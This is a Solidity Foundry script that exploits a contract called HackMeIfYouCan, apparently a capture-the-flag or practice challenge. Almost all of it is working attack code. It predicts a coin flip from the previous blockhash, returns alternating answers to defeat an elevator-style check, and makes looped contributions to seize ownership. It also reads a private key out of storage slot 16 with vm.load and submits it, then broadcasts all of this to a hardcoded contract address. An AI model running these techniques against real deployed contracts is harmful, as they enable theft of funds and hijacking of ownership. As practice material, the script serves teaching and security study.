// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";

contract Player {
    HackMeIfYouCan public hackMeIfYouCanInstance;
    bool public switchFlipped = false;
    uint256 constant FACTOR = 6275657625726723324896521676682367236752985978263786257989175917;
    uint256 lastHash;

    constructor(address _hackMeIfYouCanInstance) {
        hackMeIfYouCanInstance = HackMeIfYouCan(payable(_hackMeIfYouCanInstance));
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!switchFlipped) {
            switchFlipped = true;
            return false;
        } else {
            switchFlipped = false;
            return true;
        }
    }

    function flip() public payable returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        console.log("Current block hash:", blockValue);

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        console.log("Side guessed:", side);
        return hackMeIfYouCanInstance.flip(side);
    }
}

contract HackScript is Script {
    HackMeIfYouCan public hackMeIfYouCanInstance;
    Player public player;
    address public owner;
    address attacker = 0x98B6388f0acFa325f1d93438A647E1e4Cfb156f2;

    bool res;

    function setUp() public {
        owner = address(this);
        bytes32[15] memory data;
        for (uint256 i = 0; i < 15; i++) {
            data[i] = bytes32(i);
        }
        bytes32 password = bytes32(uint256(123));
        hackMeIfYouCanInstance = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));

        // Flip
        player = new Player(address(hackMeIfYouCanInstance));
    }

    function run() public {
        vm.startBroadcast();
        res = player.flip();
        console.log("Flip result:", res);

        exploitContribute();

        // Receive
        hackMeIfYouCanInstance.contribute{value: 0.0001 ether}();
        (bool success, ) = address(hackMeIfYouCanInstance).call{value: 0.0001 ether}("");
        require(success, "Ether transfer failed");
        console.log("Marks after sending ether:", hackMeIfYouCanInstance.getMarks(tx.origin));
        
        // Send key
        bytes32 dataValue = vm.load(address(hackMeIfYouCanInstance), bytes32(uint256(16)));
        hackMeIfYouCanInstance.sendKey(bytes16(dataValue));
        console.log("Marks after sending key:", hackMeIfYouCanInstance.getMarks(tx.origin));

        vm.stopBroadcast();
    }

    function exploitContribute() internal {
        uint256 contributionAmount = 0.0009 ether;

     for (uint256 i = 0; i < 10; i++) {
            (bool success,) =
                address(hackMeIfYouCanInstance).call{value: contributionAmount}(abi.encodeWithSignature("contribute()"));
            require(success, "Contribution failed");

            console.log("Contribution #%d made by attacker", i + 1);
            console.log("Attacker's total contribution:", hackMeIfYouCanInstance.contributions(attacker));
            console.log("Current owner:", hackMeIfYouCanInstance.owner());
        }

        require(hackMeIfYouCanInstance.owner() == attacker, "Attacker did not become the owner");
        console.log("Exploit successful! Attacker is now the owner.");
    }

    receive() external payable {}
}
